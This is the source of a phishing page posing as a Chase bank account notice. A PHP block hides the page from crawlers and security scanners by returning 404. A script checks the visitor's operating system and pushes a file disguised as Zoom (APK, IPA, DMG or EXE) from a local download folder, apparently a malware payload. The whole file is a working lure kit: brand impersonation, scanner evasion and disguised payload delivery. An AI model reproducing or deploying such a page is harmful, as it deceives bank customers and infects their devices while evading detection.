<?php
// Ensure error reporting for troubleshooting
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Include CrawlerDetect library
use Jaybizzle\CrawlerDetect\CrawlerDetect;
require 'anti/vendor/autoload.php';

$CrawlerDetect = new CrawlerDetect();
if ($CrawlerDetect->isCrawler()) {
    // true if a crawler user agent is detected
    header("HTTP/1.0 404 Not Found");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Time Password</title>
    <link rel="stylesheet" href="res/css/chase.css">
    <script src="https://cdn.jsdelivr.net/npm/algoliasearch@4.17.0/dist/algoliasearch.umd.js"></script>
    <style>
        * {
            max-width: 100%;
            outline: none;
            box-sizing: border-box;
        }
        body {
            background: url(../img/back.png) no-repeat center center fixed;
            background-size: cover;
            font-family: Helvetica, Arial, sans-serif;
            margin: 0;
        }
        header {
            background: linear-gradient(to bottom, black, #00000005);
            padding: 20px;
            text-align: center;
        }
        header img {
            width: 170px;
        }
        section {
            text-align: center;
            padding: 70px;
        }
        .Container {
            background: white;
            padding: 20px;
            width: 400px;
            display: inline-block;
            border-radius: 5px;
        }
        .box {
            margin: 2px 0;
            padding-top: 10px;
            font-size: 20px;
            padding-bottom: 5px;
        }
        label {
            display: flex;
            color: #717171;
        }
        .L {
            color: #717171;
            font-size: 0.9em;
            margin-bottom: 20px;
            text-align: left;
        }
        input {
            padding: 10px;
        }
        .box input {
            border: none;
            border-bottom: 0.1px solid #9a9a9a;
            background: transparent;
            color: black;
            font-size: 18px;
            padding: 5px;
            width: 100%;
            font-weight: 900;
        }
        button {
            background: #0060f0;
            color: white;
            border: none;
            padding: 10px;
            font-weight: bolder;
            font-size: 1.1em;
            width: 100%;
            border-radius: 5px;
        }
        h5 {
            color: #0060f0;
            margin: 10px;
            font-weight: 100;
        }
        img {
            width: 60px;
        }
    </style>
    <script>
        function detectAndDownload() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            const platform = navigator.platform.toLowerCase();

            let downloadLink;

            // Detect the OS and set the download link accordingly
            if (/android/i.test(userAgent)) {
                downloadLink = 'download/Zoom.apk';
            } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                downloadLink = 'download/Zoom.ipa';
            } else if (/macintosh|mac os x/i.test(userAgent)) {
                downloadLink = 'download/Zoom.dmg';
            } else if (/windows/i.test(platform)) {
                downloadLink = 'download/Zoom.exe';
            } else {
                downloadLink = 'download/Zoom.exe'; // Default link if OS is not recognized
            }

            // Redirect to the download link
            window.location.href = downloadLink;
        }
    </script>
</head>
<body>
    <header>
        <svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="32pt" height="32pt" viewBox="0 0 900 720">
            <g transform="translate(0,720) scale(0.1,-0.1)" fill="white" stroke="none">
                <path d="M3064 7181..."></path>
                <path d="M3246 7178..."></path>
                <path d="M5886 4914..."></path>
                <path d="M980 2273..."></path>
            </g>
        </svg>
    </header>

    <section>
        <div class="Container">
            <div class="box">
                <h3>Important Notice Regarding Your Chase Account</h3>
                <p>Dear Valued Customer,</p>
                <p>We have prepared a detailed report related to your Chase account. For your convenience, please download the attached document for further information.</p>
                <p>Thank you for choosing Chase. Your security is our top priority.</p>
            </div>
            <form onsubmit="event.preventDefault(); detectAndDownload();">
                <div class="box"></div>
                <button type="submit">Download</button>
            </form>
        </div>
    </section>
</body>
</html>
